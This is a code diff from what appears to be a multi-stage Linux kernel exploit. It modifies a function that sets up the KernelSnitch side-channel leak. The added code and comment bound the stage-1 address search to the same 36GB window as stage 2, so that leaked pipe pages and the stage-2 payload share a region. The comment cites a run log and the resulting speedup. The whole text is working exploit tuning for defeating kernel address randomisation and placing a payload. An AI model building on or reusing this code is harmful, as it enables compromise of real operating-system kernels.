@@ -304,6 +304,33 @@ void setup_kernelsnitch(void) {
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_SLAB_ORDER, cpu_count, KSNITCH_COLLISIONS,
       KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
+  /*
+   * Bound the stage-1 pipe KernelSnitch leak to the same identity window as
+   * stage-2.  Run 20260810-200258: stage-1 scanned the full 64GB
+   * (candidates=8388608/thread, ~5s) and found its mm anywhere in
+   * 0xffffff80..0xffffff90.  A stage-1 leak outside 0xffffff80..0xffffff88
+   * (e.g. 0xffffff8e) puts the 240 pipe pages in a region stage-2's bounded
+   * 36GB search can never reach, making a gate overlap impossible BY
+   * CONSTRUCTION.  Restricting stage-1 to the same 36GB keeps the pipe pages
+   * and the stage-2 payload in the same region and halves the scan time, so
+   * more stage-1 attempts / FRESH rounds fit in the p0 timeout.
+   */
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(APP_KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
+    defined(APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
+  size_t pipe_mm_objs_per_slab = (PAGE_SIZE << MM_SLAB_ORDER) / MM_STRUCT_SZ;
+  size_t pipe_min_object_index = APP_SLIDE_MIN_OBJECT_INDEX;
+  size_t pipe_max_object_index = APP_SLIDE_MAX_OBJECT_INDEX;
+  if (pipe_min_object_index >= pipe_mm_objs_per_slab)
+    pipe_min_object_index = 0;
+  if (pipe_max_object_index >= pipe_mm_objs_per_slab)
+    pipe_max_object_index = pipe_mm_objs_per_slab - 1;
+  kernelsnitch_set_search_bounds(
+      ks, KERNELSNITCH_IDENTITY_START,
+      APP_KERNEL_PAGE_KSNITCH_IDENTITY_END,
+      pipe_min_object_index, pipe_max_object_index,
+      APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
+#endif
   configure_kernelsnitch_profile(ks, PAGE_PAYLOAD_SLIDE);
 #else
   /*
